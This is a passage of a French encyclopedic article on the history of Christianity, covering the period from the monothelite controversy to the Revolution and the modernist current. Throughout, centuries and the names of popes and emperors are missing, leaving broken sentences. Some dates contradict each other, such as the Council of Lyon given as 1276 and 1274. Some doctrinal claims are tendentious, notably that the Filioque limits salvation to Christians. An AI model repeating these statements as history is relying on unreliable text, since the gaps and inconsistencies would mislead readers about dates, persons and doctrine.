Le concile œcuménique de Constantinople de 680 condamne le monothélisme et confesse la pleine humanité du Christ en lui reconnaissant une volonté humaine, faillible (colère face aux marchands du Temple, « "Eli, Eli, lama sabachtani ?" » : « mon Dieu, pourquoi m'as-tu abandonné ? ») distincte de sa volonté divine, infaillible (chaque fois qu'il parle au nom du « père »). Selon certains auteurs, le monothélisme se prolonge dans le maronisme. Cette décision ne fit pas disparaître le monothélisme du Proche-Orient : un schisme eut lieu dans l'Église melkite d'Alexandrie, dirigé par Harmasios (les « harmasites ») ; au Liban, l'Église maronite, qui s'autonomisa dans les années suivant le concile (son premier évêque, Jean Maron, fut intronisé vers 687), était sans doute à l'origine un schisme monothélite (mais la question est controversée) ; d'autre part, l'Arménien Bardanès, devenu empereur byzantin en 711, n'eut rien de plus pressé que d'annuler ce concile et rétablir le monothélisme comme doctrine officielle, ce que l'épiscopat grec accepta d'ailleurs sans broncher (selon le chroniqueur Théophane, son conseiller religieux était un moine de Constantinople).
Moyen Âge.
Contexte politique.
Le partage de l’Empire romain (395) et la supposée disparition de l’Empire romain d’Occident (476) sous les assauts des invasions barbares, vont avoir pour conséquences l’éloignement progressif des chrétientés occidentale et orientale et la revendication tout aussi progressive d'une affirmation de la papauté dans l’ex-Empire romain d’Occident, où il n’existe plus d’autorité temporelle suprême. Ces articulations de chronologie basées sur les crises de l'Empire romain ne sont pas très pertinentes pour l'histoire du christianisme, sauf si l'on veut se cantonner à l'histoire de l'Église catholique romaine et suggérer qu'elle succède et se substitue à l'empire romain d'Occident.
Par ailleurs, l'émergence de l'islam au et son expansion progressive vont concurrencer le christianisme sur certaines terres. Ainsi, le passage d’une grande partie des chrétiens du Moyen-Orient et d'Espagne sous domination musulmane (), à la suite des premières guerres arabo-byzantines et à la Conquête musulmane du Maghreb puis de l'Espagne wisigothique (renommée Al-Andalus) modifie profondément le paysage du christianisme.
Élaboration du concept historiographique d'Orient et d'Occident.
L'étude de la séparation de 1054 entre l'Église romaine et les autres est notamment le fait de Peter L. Brown.
L’histoire des rapports entre l'Église d'Occident et les Églises d’Orient devient chaotique et reflète les rivalités de personnes et de sièges. Selon cette vision, du , naît, de l’Irlande à la Pologne, et de la Suède à l’Italie, une nouvelle civilisation romano-barbare, dont la religion sera une forme particulière de christianisme qui deviendra le catholicisme romain.
Sous (366-384) débute la revendication de l’autorité de l’évêque de Rome, comme successeur de Pierre (apôtre), en matière de discipline et de liturgie. Le pape (440-461) pousse encore davantage dans de nombreux écrits l’exaltation du siège de Pierre mais déclare être un fidèle sujet de l'empereur. Au concile de Chalcédoine, l'église occidentale refuse l'une des conclusions du concile : le document faute d'accepter de partager la primauté d'honneur en commun Constantinople ; elle la réclame pour elle seule.
Face à l’empereur Anastase, le pape (492-496) affirme dans un texte célèbre la primauté du pouvoir spirituel face au temporel. La reconquête de l’Italie par l’empereur Justinien, achevée au milieu du , replace néanmoins provisoirement le pape dans l’orbite de l’Empire. Au , à la suite de l’invasion des Lombards, l’empire byzantin perd progressivement la plus grande partie de ses territoires italiens et la papauté cherche à devenir une puissance autonome en Italie. Les ravages des Lombards en Italie coïncident avec le pontificat de (590-604). Ce pape énergique assume le gouvernement civil de Rome, affermit l’autorité de Rome sur les évêchés italiens, s’efforce d’entretenir des relations suivies avec les autres Églises d’Occident et travaille à la conversion de l’Europe du Nord. C'est aussi à partir du qu'on assiste progressivement à l'essor des écoles cléricales qui prennent le relai du réseau scolaire antique, qui s'était désintégré lors des invasions barbares. Ce processus culmine avec la Renaissance carolingienne aux . Charlemagne assure la papauté comme puissance autonome en vers 756, au moment où il vainc les Lombards, en la dotant d'un patrimoine dit « de Saint-Pierre » et légitimé ultérieurement par la donation de Constantin, qui est un faux. En retour, le pape le sacre « empereur d'Occident » signifiant la fin du pouvoir, sur ces territoires, de l'empereur d'Orient dont le trône est à ce moment tenu par une femme : Irène. La rupture politique entre Orient et Occident est alors consommée ; mais religieusement, l'Église de Rome fait toujours partie de la « communion des sept premiers conciles » et de la « Pentarchie ».
L’Église d’Occident des Carolingiens à la féodalité.
Au milieu du , la papauté et les Carolingiens nouent des relations qui vont se révéler profitables pour les deux parties, et lourdes de conséquences pour la suite de l’histoire de l’Occident. À la demande de Pépin le Bref, le pape Zacharie apporte par une lettre son soutien moral à l’élimination de la dynastie mérovingienne : Pépin se fait sacrer roi. En échange de cet appui, Pépin mène en Italie deux expéditions dans le but de lever la menace que les Lombards font peser sur Rome. C’est dans ces circonstances qu’est créé l’État pontifical, qui ne disparaîtra qu’en 1870. Cette alliance est encore plus étroite sous le fils de Pépin, Charlemagne. Celui-ci fait adopter la liturgie romaine, à un moment où l’extension du royaume franc correspond à celle de la Chrétienté occidentale (à l’exception des Îles britanniques et du petit Royaume des Asturies). Lors de la guerre contre les Saxons d'Allemagne (772-805), Charlemagne ordonne aussi la conversion en masse, et par la force, de la population, afin d'humilier son adversaire. C'est aussi sous Pépin le Bref et Charlemagne que l'ancêtre du chant grégorien, le chant messin, se développe, sous l'influence de l'évêque Chrodegang de Metz, qui agit en tant qu'intermédiaire entre Pépin le Bref et la papauté.
La crise iconoclaste.
La controverse iconoclaste est la . Elle se déroule au haut Moyen Âge.
Au , l’iconoclasme est une réaction au culte des images (ou « icônes »). Ce culte se manifeste de diverses façons ; de l’illumination de l’icône à la prosternation, jusqu’à la conviction que l’icône a un caractère agissant par elle-même. Les raisons de la crise ne sont pas claires. a invoqué entre autres l’influence du judaïsme et de l’islam. Les premières mesures iconoclastes sont prises en 725 par l’empereur . Il remplace le patriarche Germanós par un iconoclaste, Anastase. Dans un premier temps, il n’y a pas de persécutions. Le successeur de Léon, l’empereur Copronyme, convoque un concile qui fait de l’iconoclasme la doctrine officielle de l’Empire d’Orient. Il doit faire face à l’opposition des moines qui sont iconodules (partisans du culte des images). Sous l’impératrice Irène a lieu une réaction : en 786-87, un nouveau concile renverse la tendance et rétablit le culte des images. La hiérarchie « orthodoxe » suit la volonté impériale. En 815, un autre empereur, , revient à l’iconoclasme. Il doit faire face à une opposition puissante menée par Théodore le Stoudiote. Dès la mort de l’empereur Théophile, en 845, le culte des images est définitivement rétabli.
Lutte entre l'Église d'Occident et les pouvoirs temporels aux.
L'Église d'Occident se veut l'instance spirituelle, supérieure - dans la conception aristotélicienne - à l'état temporel. Depuis l'époque carolingienne, le pape est également à la tête d'un État et ne manquera pas de jouer sur les deux tableaux.
Au , l'évêque de Rome devenu pape est sous la tutelle de l’aristocratie romaine quand se dissout l'Empire carolingien, puis sous celle des empereurs germaniques. L’ensemble du monde religieux est sous l’emprise des seigneurs féodaux, dans laquelle la fonction d’évêque est un bien de famille.
L’idée d'indépendance fait son chemin. Au , sous l’influence du moine Hildebrand, le pape confie l’élection pontificale au collège des cardinaux (1059). En 1073, Hildebrand devient pape sous le nom de . Il va lancer ce que l’on appelle la . Sa doctrine est élaborée dans le "Dictatus papæ", qui affirme la primauté du Pape y compris sur les autres souverains. Au même moment, Grégoire VII favorise la construction du droit canonique, discipline centrale de l'Université de Bologne fondée en 1080, qui sera codifiée avec le décret de Gratien au .
En s’attaquant à l’investiture laïque, Grégoire VII entre en conflit avec l’empereur germanique . Celui-ci fait déposer le pape par une assemblée d’évêques à Worms. C’est le début de la Querelle des Investitures. Le pape fait à son tour déposer l’empereur. Face à la rébellion de nombreux vassaux, l’empereur : en tenue de pénitent, il va implorer le pardon du pape au château de Canossa en Toscane (1077). En fin politique, en 1080, l'empereur fait élire un antipape, . Ce n’est qu’en 1122, que son fils conclut avec le pape un accord connu sous le nom de concordat de Worms. Aux termes de ce compromis, l’investiture temporelle des évêques et abbés revient à l’empereur, tandis que le pape leur accorde l’investiture spirituelle. La papauté n’entend cependant pas renoncer à ses prétentions. En 1139, le deuxième concile du Latran affirme que . Le conflit reprend de plus belle au milieu du : il oppose l’empereur Frédéric Barberousse au pape , avec un schéma sensiblement identique : l’empereur fait désigner un antipape, tandis qu’ s’allie à la ligue des villes lombardes. Le conflit militaire tourne au désavantage de Frédéric Barberousse, qui doit signer la paix de Venise (1177). Cet épisode aura une conséquence importante : au troisième concile du Latran (1179), il est décidé que le pape sera dorénavant élu à la majorité des deux tiers du collège des cardinaux.
La rupture de la « Pentarchie » par le schisme de 1054.
Au , le premier problème grave tourne autour de la nomination du patriarche de Constantinople. L’empereur dépose le patriarche Ignace, et le remplace par Photios. Le pape , qui y voit une occasion d’intervenir dans les affaires de Constantinople, finit par refuser de reconnaître Photios: c'est le . On évoque alors, pour la première fois, la question du , qui reste en suspens lorsque le pape et Photios réconcilient. Le schisme de 1054 dont les origines sont politiques, intervient lorsque le légat du pape Hubert de Moyen-moutier et le patriarche de Constantinople Michel Cérulaire s’excommunient mutuellement. La séparation des églises suit en gros la frontière linguistique et politique qui partageait les deux Empires d'Occident et d'Orient : les églises de liturgie latine suivent Rome, celles de liturgie grecque, slavonne ou roumaine suivent Constantinople. Les quatre patriarcats d'Orient (Jérusalem, Alexandrie, Antioche et Constantinople) continuent à suivre le symbole de Nicée-Constantinople, tandis que l'église de Rome y ajoute le , une modification doctrinale due à Charlemagne, qui change complètement les rapports de l'Église romaine avec les non-catholiques, puisqu'avec le , seule une âme chrétienne peut être sauvée, alors que sans lui, Dieu peut sauver toute âme, chrétienne ou non : cette différence va rendre le prosélytisme et les missions de l'Église latine, mais aussi sa volonté de contrôle sur ses fidèles (Inquisition) beaucoup plus fortes qu'auparavant, et va contribuer à motiver les croisades, émaillées d’une multitude d’incidents entre et .
En 1204, le sac de Constantinople par les croisés va consommer la rupture. Mais ce sont les innovations doctrinales et canoniques de Rome qui la rendent irréversible (Filioque, Purgatoire, autorité temporelle des papes, célibat des prêtres, inquisition...). À deux occasions, au deuxième concile de Lyon en 1276 et au concile de Florence en 1439, pour obtenir le soutien des armées occidentales contre la conquête musulmane, des empereurs byzantins reconnaissent la primauté du pape de Rome, et tentent de reconstituer la « Pentarchie », mais sont désavoués par la hiérarchie de ce que l’on peut maintenant appeler l’Église orthodoxe. Après la chute de l'empire d'Orient, du au, l'Église occidentale n'aura de cesse que de reconquérir les petites églises en sorte d'isoler les églises orthodoxes.
Enfin, la Quatrième croisade, en affaiblissant de manière irréversible l'Empire byzantin dont les ressources économiques sont captées par les thalassocraties vénitienne et génoise, l'empêche de continuer à jouer son rôle de « bouclier de l'Europe » face aux Turcs ottomans qui débarquent en 1332 en Europe, encerclent Constantinople qu'ils prennent en 1453, puis portent en 1526 leur frontière aux portes de Vienne, qu'ils assiègent en 1529 et 1683.
Apogée de la société chrétienne occidentale au.
Le processus engagé aux culmine au , sous le pontificat d’. Celui-ci a une conception élevée de la fonction pontificale. Sur le plan spirituel, son autorité est sans partage et s’exerce à travers toute la chrétienté occidentale par l’envoi de légats pontificaux. Sur le plan temporel, il fait une distinction entre l’"auctoritas" du pape et la "potestas", que les souverains tiennent du pape. intervient dans les affaires temporelles de nombre d’États en excommuniant ou déposant les souverains. Il obtient par ailleurs que plusieurs de ces souverains se déclarent vassaux du Saint-Siège (notamment Jean sans Terre, roi d’Angleterre). Ses successeurs reprennent la lutte contre l’Empire incarné par le Hohenstaufen . Le conflit sans merci qui oppose les guelfes (partisans du pape) aux gibelins (partisans de l’empereur), tourne à l’avantage de la papauté : grâce à l’appui de Charles d’Anjou, la dynastie des Hohenstaufen est éteinte et le Saint-Empire éliminé d’Italie. La papauté triomphe également en Orient : au deuxième concile de Lyon (1274) l’empereur , partisan de l’, reconnaît la primauté du pape de Rome. Ces succès sont de courte durée : dès la mort de , l’Église byzantine rejette l’union, tandis qu’en Occident le roi de France Philippe le Bel, irrité par les ingérences du Saint-Siège, opère un coup de force : lors de l’épisode connu sous le nom d’, il s’en prend physiquement au pape Boniface VIII (1303), qui meurt du choc de cette humiliation.
Crises de l’Église aux.
Grosso modo, du point de vue l'église latine, le christianisme connait une hérésie par siècle, parfois plus. Venu s’installer provisoirement à Avignon pour préparer le concile de Vienne, destiné à condamner les Templiers, le pape français finit par y demeurer, vu l’insécurité qui règne en Italie. Cette situation se perpétue sous ses successeurs et . L’administration papale atteindra un degré de centralisation inégalé jusqu’alors, notamment en matière de fiscalité pontificale, mais les prétentions de la papauté à gouverner le monde chrétien suscitent de plus en plus d’opposition, notamment de la part de théologiens comme Marsile de Padoue ou Guillaume d'Ockham. Les monarchies occidentales comme la France et l’Angleterre, elles aussi sur la voie de la centralisation, se rebiffent. C’est cependant le luxe de la cour papale qui finit par scandaliser bon nombre de chrétiens.
L’écrivain Pétrarque la traite de et Catherine de Sienne la dénonce en termes encore plus violents. Sensible à ces critiques, le pape revient s’installer à Rome en 1377. À peine élu, son successeur , extrêmement autoritaire, entre en conflit avec les cardinaux. Sous prétexte qu’ils ont élu le nouveau pape sous la contrainte de la population romaine, une majorité de ceux-ci procèdent à l’élection d’un nouveau pape, , qui s’installe à Avignon. refuse de s’effacer. C’est le début du Grand Schisme d'Occident (1378-1417).
La querelle d’obédience divise le monde chrétien occidental tout entier. Le schisme se prolonge après la mort des deux protagonistes, qui ont chacun un successeur. Le concile de Pise (1409), embrouille encore un peu plus la situation en élisant un troisième pape. Dans une Chrétienté occidentale désorientée, des remises en cause doctrinales voient le jour: en Angleterre celle de John Wyclif condamnée en 1382 et surtout en Bohême celle de Jan Hus, moins radicale mais plus durable. L’empereur Sigismond convoque le concile de Constance en 1414. Celui-ci condamne les théories de Wyclif et Hus. Ce dernier est exécuté. Le concile dépose ensuite les trois papes et procède à l’élection d’un pape qui fait enfin l’unanimité : . Si l’unité de l’Église est rétablie, le besoin de réformes continue à se faire sentir. Certains théologiens voient la solution dans la tenue régulière de conciles (conciliarisme). Ces thèses se retrouvent d’ailleurs dans les décrets "Haec sancta" et "Frequens" du concile de Constance. Le concile de Bâle à peine réuni en 1431, il est dissous par le pape . Les participants au concile se rebiffent et refusent de se disperser. Ce mini-schisme se termine par la victoire du pape qui manœuvre habilement en convoquant un nouveau concile à Ferrare puis à Florence.
Si la primauté du pape sur les conciles est acquise pour longtemps, le pouvoir papal est néanmoins battu en brèche sur plusieurs fronts, qu’il s’agisse de l’indépendance des Églises nationales, comme en France où le roi promulgue la Pragmatique Sanction de Bourges, ou de la persistance de mouvements radicaux, comme en Bohême, où le pape doit transiger avec les Hussites. Par ailleurs, les conflits au sommet de l’Église ont jeté le trouble dans l’esprit des fidèles, dont la piété prend un caractère plus personnel. Au , le christianisme occidental est traversé par un courant mystique, dont Maître Eckhart et Jean de Ruisbroek sont les représentants les plus connus.
Le temps des réformes.
Le temps des Réformes n'est pas seulement l'affaire des Églises qui en sont issues. C'est un mouvement européen issu de facteurs religieux, politiques, démographiques, économiques, culturels et technologiques.
Les facteurs de la Réforme.
Facteurs religieux.
Au et au début du , la chrétienté est encore imprégnée par certains aspects de la mentalité du Moyen Âge. Elle est tourmentée par la peur de la damnation éternelle et par l'espérance du salut. L'Église a mis en place au cours des siècles tout un arsenal de mesures permettant de gagner son salut et de réduire la durée passée au purgatoire : jeûne, pénitence, pèlerinages, prières, processions, culte de la Vierge, culte des saints et commerces des reliques, commerce des indulgences. Le bas clergé issu du peuple est à peine instruit et contribue à faire de la religion un ensemble de pratiques plus proches de la superstition que de la foi. Le peuple des fidèles, souvent illettré (seulement 10 % de la population sait lire), qui entend la parole de Dieu proclamée en latin dans les églises, et qui donc n'a accès qu'à des commentaires de la Bible en langue vulgaire, est souvent désorienté par ces pratiques formelles. La croyance à la sorcellerie est très répandue. Les réformateurs n'auront donc de cesse de revenir à la source : l'interprétation de la Bible, traduite en langue vernaculaire.
Facteurs politiques.
Au début du , la chrétienté est essentiellement répartie entre l'Espagne et le Saint-Empire romain germanique, vaste ensemble dirigé par Charles Quint, la France dirigée par , le Portugal, l'Angleterre, les États pontificaux, et les pays scandinaves. Elle est menacée à l'est par l'Empire ottoman. Les rivalités entre certains souverains, surtout ceux qui dirigent les deux principales puissances du continent, Charles Quint et (qui n'hésitera pas à s'allier avec les Ottomans contre Charles Quint), auront pour effet de retarder la tenue d'un concile pour régler les questions religieuses. Le concile de Trente n'ouvrira qu'en 1545 et ne se terminera, après deux interruptions, qu'en 1563, alors que la rupture entre catholiques et protestants est déjà consommée.
Facteurs démographiques.
Le mouvement des essartages produit une meilleure nourriture et l'allongement de la durée de la vie. Des surplus se dégagent et créent des courants commerciaux et donc monétaires. L'Église encourage le retard de l'âge du mariage ; une nouvelle période de la vie se développe : l'adolescence propice aux études. L'Église développe donc des écoles.
Facteurs culturels.
On invente la philologie (étude des textes), et la critique textuelle grâce à laquelle Lorenzo Valla démontre que la Donation de Constantin est un faux du . Avec l'exil des érudits grecs, à la suite de la chute de Byzance, on voit arriver en Occident des manuscrits bibliques grecs que personne n'avait jamais vus ; les humanistes contribuent à cette remise en question.
Les voyages des grandes découvertes amènent à s'interroger sur le salut des indigènes avant leur évangélisation, partant sur son propre salut dans un environnement où la mort est toujours proche, celui des grandes pestes.
Facteurs économiques et technologiques.
Les grandes découvertes favorisent une extension du commerce, à partir de l'Espagne et d'une partie des féodaux européens (anglais, italiens, espagnols, princes d'Europe centrale et baltes). L'adoption d'un bi-métallisme produit un enrichissement et la faculté de devenir mécène. Les papes issus des grandes familles italiennes se conduisent comme n'importe quels féodaux.
À la fin du , l’Église était en crise. Au niveau de la papauté et du haut clergé cette crise se manifestait par des pratiques et des comportements qui n’avaient plus aucun rapport avec la foi : les papes faisaient la guerre et se préoccupaient plus de s’enrichir que de faire respecter la religion. Ils pratiquaient le népotisme, c’est-à-dire qu’ils plaçaient leurs protégés (souvent leurs enfants illégitimes) à des postes importants ; le haut clergé pratiquait le cumul des bénéfices ecclésiastiques ; on vendait des simonies et on se livrait à la vente d’indulgences (pardon des péchés). Des croyants réagissent à cette situation.
L'invention de l'imprimerie rend le livre plus accessible, moins cher et donc plus répandu. On imprime aussi des tracts et des placards. La première bible est imprimée (en latin) dès 1455. Les écrits des réformateurs sont largement diffusés grâce à l'imprimerie.
La Réforme protestante.
L'adoption de la Réforme est aussi un caractère politique. C'est un moyen pour les princes d'affirmer leur indépendance face à une papauté revendiquant une théocratie universelle ou pour les populations de pouvoir se révolter face un souverain mal accepté comme en Écosse et aux Pays-Bas espagnols. Dès le , se développent au sein de la Réforme des mouvements plus radicaux appelés à jouer un rôle dans le développement du protestantisme : le puritanisme en Angleterre et le baptisme en Europe centrale. Par ailleurs, les nouvelles colonies anglaises en Amérique du Nord serviront de refuge à de nombreux groupes persécutés en Europe. Ceci explique que les États-Unis soient encore actuellement un des foyers les plus vivaces du protestantisme avec l'Europe du Nord (Suède, Danemark, Lituanie, Pays-Bas) et l'Europe Centrale (Allemagne, Suisse, Hongrie).
Les excès commis par un petit groupe d’anabaptistes fanatiques qui avaient pris le pouvoir à Münster en 1534 ont contribué à dresser contre eux les autorités tant catholiques que protestantes. La majorité des anabaptistes sont pourtant pacifistes, comme en témoigne la prédication de Menno Simons (1496-1561), un de leurs principaux dirigeants, auquel doit son nom les mennonites. Un autre groupe d'anabaptiste, implanté en Moravie, porte le nom de frères Moraves.
Dès le début du , le protestantisme s’épanouit en Amérique du Nord. La plupart des colonies anglaises ont été fondées par des groupes protestants très divers. Un des groupes les plus connus est celui des "Pilgrim Fathers" ou pères pèlerins qui fondent Plymouth au Massachusetts en 1620, composé de Puritains anglais. À partir de 1639, Roger Williams, chassé du Massachusetts, fonde des Églises baptistes dans la colonie de Rhode Island. Le quaker anglais William Penn (1644-1718) fonde en 1682 la colonie de Pennsylvanie. Il y invite les mennonites allemands, persécutés dans leur pays, qui arrivent par dizaines de milliers. Des calvinistes écossais et hollandais fondent des communautés presbytériennes.
La Réforme dans le Saint-Empire.
Martin Luther (1483-1546) est un moine tourmenté par son salut, il s’interroge donc sur la situation décrite ci-dessus. Dès 1515, il commence à la religion en donnant des cours sur certaines épîtres de Paul (dont l'épître aux Romains), et en 1517, quand les envoyés du pape arrivent pour vendre les indulgences, il affiche sur la porte de son église 95 thèses, dans lesquelles il condamne la vente d'indulgences et les autres abus de l’Église. Le pape le somme de se rétracter et face à son refus l’excommunie.
Luther devra également faire face à l’empereur Charles Quint. Ce dernier, soucieux de ménager à la fois le pape et les princes de l’Empire dont certains avaient déjà rallié le luthéranisme (nom de la doctrine de Luther), hésitera entre la répression et la tolérance. D’abord, il chasse Luther mais devant les protestations de certains princes luthériens (d’où le nom de religion protestante), il accorde à chaque prince le droit de choisir sa religion, ses sujets étant obligés de le suivre.
Les thèses de Luther :
Du point de vue politique, il se range du côté des bourgeois contre les paysans et le petit peuple qui avaient cru trouver un soutien dans sa doctrine et s’étaient révoltés contre leurs princes avec la Réforme radicale.
La Réforme en Suisse.
En Suisse, la Réforme a lieu en même temps qu’en Allemagne. Les idées du réformateur suisse Ulrich Zwingli (1484-1531) sont au départ proches de celles de Luther. À partir de 1529, il s’éloigne du luthéranisme et perd le soutien des princes allemands. Il est tué en 1531 à la bataille de Kappel, qui oppose les cantons suisses catholiques à Zurich. Cette défaite militaire freine le développement du protestantisme en Suisse. Le réformateur français Calvin appelé, chassé, puis rappelé à Genève (1541), fait de cette ville un bastion du protestantisme. Il fait condamner à mort et brûler Michel Servet parce que celui-ci réfutait la doctrine de la Trinité.
La Réforme en France.
Les idées de Luther inspirent un juriste français, Jean Calvin (1509-1564). Ce dernier propage d’abord le luthéranisme puis le transforme en une doctrine plus sévère. Pour le calvinisme, l’homme est entièrement soumis à Dieu : chacun est d'avance prédestiné à recevoir, ou non, la grâce: dans le débat entre la grâce divine et le libre arbitre, celle-là l'emporte nettement. Il faut gouverner suivant les Écritures (dépouillement total des lieux de cultes, réglementation des tenues vestimentaires, bijoux, etc.).
Cette doctrine, dont le succès est partiel en France, s’impose en Suisse, dans le nord des Provinces-Unies (actuels Pays-Bas) et en Écosse. Par ailleurs, des calvinistes persécutés en Angleterre émigrent en Amérique du Nord, notamment aux États-Unis.
En France, la Réforme aboutit à la persécution des Huguenots et à de sanglantes guerres de religion. En 1598, l’édit de Nantes y mit un terme pour 60 ans en autorisant le culte réformé, jusqu'à la révocation de cet édit par en 1685. Les Huguenots sont à nouveau persécutés par les Dragonnades et forcés à se convertir au catholicisme.
La Réforme en Angleterre.
Dans ce pays, les motivations sont d'abord politiques ; leur caractère religieux tient à l'indépendance de l'église d'Angleterre en regard d'une volonté pontificale théocratique. Le roi d’Angleterre, , veut être le seul à contrôler son royaume (absolutisme). Il désire donc se débarrasser du pouvoir que détient le pape sur l’Église d’Angleterre. Il trouve un prétexte (son divorce refusé par le pape) et, en 1534, se proclame chef de l’Église d’Angleterre ou anglicane. L’anglicanisme réunit une grande partie de la doctrine calviniste et la hiérarchie et du rituel catholique (décorations, fastes nécessaires pour célébrer la gloire de Dieu).
Les calvinistes qui ne tolèrent pas cette adaptation sont persécutés et s’exilent (voir puritanisme). En Angleterre les puritains ou non-conformistes estiment que l’Église anglicane ne s’est pas suffisamment dégagée du catholicisme; ils sont notamment opposés à l’organisation épiscopalienne à laquelle ils préfèrent des communautés d’anciens et des synodes, c’est-à-dire une conception congrégationaliste de l’Église. Ils sont aussi partisans d’une plus grande rigueur morale. Face à l’opposition et à la politique de persécution de la plupart des souverains anglais (sauf sous Cromwell) du , ils émigreront d’abord vers les Provinces-Unies, où ils entreront en contact avec la tendance baptiste.
Les baptistes sont opposés au baptême des enfants (pédobaptême), auquel ils préfèrent le baptême des adultes. Ils pratiquent le baptême par immersion, plutôt que par aspersion. Eux-mêmes récusent le terme d’, à savoir « qui rebaptisent » dont les affublent leurs adversaires : il ne peut en effet être question d’un , puisque celui des enfants ne peut être considéré comme valable. Leur idée du congrégationalisme va plus loin que celle des puritains : l’interprétation des Écritures repose sur le consensus qui résulte d’un débat auquel chaque membre de la communauté peut prendre part. Il s’agit d’une conception très démocratique du christianisme.
La Contre-Réforme.
« Depuis le concile de Trente, l'Église catholique n'a développé de théologie qu'anti-protestante », écrit Yves Congar. C'est une tendance de fond qui préside encore à la crise moderniste et dure jusqu'au concile.
Devant la crise politico-religieuse, l'Église catholique engage le mouvement de la Contre-Réforme, parfois nommée « Réforme catholique ». La Compagnie de Jésus y joue un rôle primordial en se plaçant directement sous l'autorité du pape et en se chargeant de la formation intellectuelle des fidèles et des missions évangélisatrices, notamment dans le Nouveau Monde et en Asie. L’Inquisition, tribunal religieux créé au , est rétablie malgré l'opposition des Jésuites. Elle fait torturer et brûler les hérétiques. En 1543, l’Index des « livres interdits » est instauré.
Pour consacrer ces décisions, le pape réunit le concile de Trente (1542-1563). Celui-ci décide de mettre un terme aux nombreux abus : concubinage des prêtres, absentéisme des évêques, ignorance intellectuelle de nombreux curés... Il maintient la doctrine catholique dans ses dogmes (le pouvoir intercesseur de la Vierge Marie et des saints, les sept sacrements, la transsubstantiation…) Il réaffirme également les pratiques et les traditions de l’Église romaine : la prière et Bible en latin, l'obligation du célibat clérical), la nécessité de la foi et des œuvres pour le salut, l’existence du purgatoire et l’émission (mais non pas la vente) d’indulgences. En d’autres termes, toutes les objections des protestants ont été rejetées sans compromis.
Le développement de la Contre-Réforme ne suit pas le même cours dans les différents pays catholiques. Dans une politique défavorable à l’égard du pape et de l’Espagne, la France n’accepte pas les principes du concile de Trente et s’oppose catégoriquement à l’inquisition. La Contre-Réforme ne débute en France que dans les années 1580. Elle atteint son apogée sous le règne de Louis XIV. En Allemagne, elle débouche sur la guerre de Trente Ans.
Expansion coloniale.
En 1455, le pape concède au Portugal l'exclusivité du commerce avec l'Afrique et encourage Henri le Navigateur à soumettre en esclavage les , comptant sur les progrès des conquêtes pour obtenir des conversions. Après la découverte de l'Amérique par les Européens en 1492, le pape est amené à arbitrer le partage du nouveau monde entre les puissances espagnoles et portugaises, et leur attribue l'activité de mission qui a souvent été considérée par les puissances coloniales comme un instrument permettant d'introduire les intérêts occidentaux, voire de légitimer des interventions politiques ou militaires. Le catholicisme s'implante aux Amériques avec les conquêtes espagnoles, au Mexique avec la conquête de Cortés et au Pérou à la suite de celle de Pizarre. Les missions vers l'Asie remportent peu de succès, sauf aux Philippines et à Goa.
Les bulles pontificales "Sublimus Dei" () et "Veritas ipsa" du pape () condamnent l'esclavage des Amérindiens ainsi que , mais n'évoque pas les Noirs. Après la Controverse de Valladolid en 1550 la traite négrière se généralise.
À l'issue des guerres de religion qui opposèrent catholiques et protestants en Europe, les colonies anglaises d'Amérique offrirent dès le un asile à ceux qui fuyaient l'intolérance religieuse en Europe. Alors que le Nord-Est restait puritain et les États du Sud anglicans, dans les États du centre l'arrivée des immigrants anabaptistes et piétistes allemands, des frères moraves tchèques, des presbytériens écossais et nord-irlandais, des huguenots français, des méthodistes et baptistes anglais notamment provoquèrent le foisonnement religieux du grand réveil. C'est dans ce contexte que de grands prédicateurs itinérants parcoururent le territoire.
L'Église coloniale prit fin en Amérique du Sud, après l'expulsion des Jésuites en 1767 puis la prise d'indépendance des États vis-à-vis de l'Europe.
L'Église catholique et la modernité.
L’Église catholique et les Lumières.
À la fin du , les premières lectures critiques de la Bible entamèrent le monopole spirituel de l’Église catholique romaine, tandis que la Révolution copernicienne avait mis en cause le géocentrisme. La hiérarchie catholique ne reviendra sur cette question qu'au milieu du , sous . Si ce dernier admet une ouverture relative de l'Église au monde moderne, il condamne toutefois sévèrement la franc-maçonnerie ("Providas romanorum", 1751). Au même moment, des philosophes athées (comme Diderot ou D'Alembert) ou déistes (comme Voltaire) ne se privent pas de critiquer l’Église, le fanatisme et les superstitions.
Bien que certains, tels Maurice Sachot, attribuent au christianisme une part importante dans la séparation des pouvoirs religieux et politiques (« rendez à César ce qui est à César »), selon Paul Veyne, « l’initiative et le gros du travail sont dus aux Lumières ». L'influence grandissante de l'idée de laïcité et de sécularisation n'est cependant pas portée uniquement par des adversaires des Églises : Kant, croyant et protestant, qui pose un jalon décisif dans l'histoire des rapports entre foi et raison, prône leur autonomie respective.
L’Église catholique et la Révolution française.
La Révolution française pose la question du rapport de l’État et de l’Église dans les pays catholiques.
Dans la foulée du gallicanisme, l’Assemblée constituante française adopte un ensemble de mesures qui transforment radicalement les structures religieuses en France :
Après une période de relative retenue, le pape Pie VI condamne officiellement les réformes visant l’Église de France le par le bref Quod Aliquantum puis par la lettre apostolique "Caritas" le . La décision de l'Assemblée constituante de mettre en place une constitution civile détachée de la papauté entraîne un schisme entre l’Église du point de vue de la Révolution (c’est-à-dire ) et les membres du clergé restés fidèles au pape (les prêtres ).
En 1791 et 1792, l'Assemblée nationale législative vote plusieurs décrets contre les prêtres réfractaires. À partir de la chute de la Royauté le 10 août 1792, les révolutionnaires les plus radicaux (sans-culottes, hébertistes...) s'en prennent aux symboles religieux. Après le début de la Première République le , la Convention nationale décide, en octobre 1793, de remplacer le calendrier grégorien par un calendrier républicain décomptant les années à partir de la date de début de la République. Il s'ensuit une période de troubles connue sous le nom de déchristianisation de l'an II, au cours de laquelle la situation dégénère en violences contre les ennemis de la Révolution et les tenants de la religion catholique.
Finalement, négocie avec le pape Pie VII le Concordat de 1801, qui servira plus tard de modèle dans de nombreux pays, et le calendrier grégorien est rétabli en 1806. Le concordat marque un souci d’apaisement et permet malgré tout au pape d’affirmer son autorité sur l’Église gallicane. Le sera marqué par l’ultramontanisme, un courant de pensée qui reconnaît l’infaillibilité et la suprématie pontificale.
Le courant moderniste.
Le monde qui émerge des guerres napoléoniennes a changé, et l’Église catholique ne retrouve ensuite jamais la position qu’elle occupait durant l’Ancien Régime. Les sociétés se sécularisent rapidement. En revanche, le Vatican envoie de nombreux missionnaires dans les colonies.
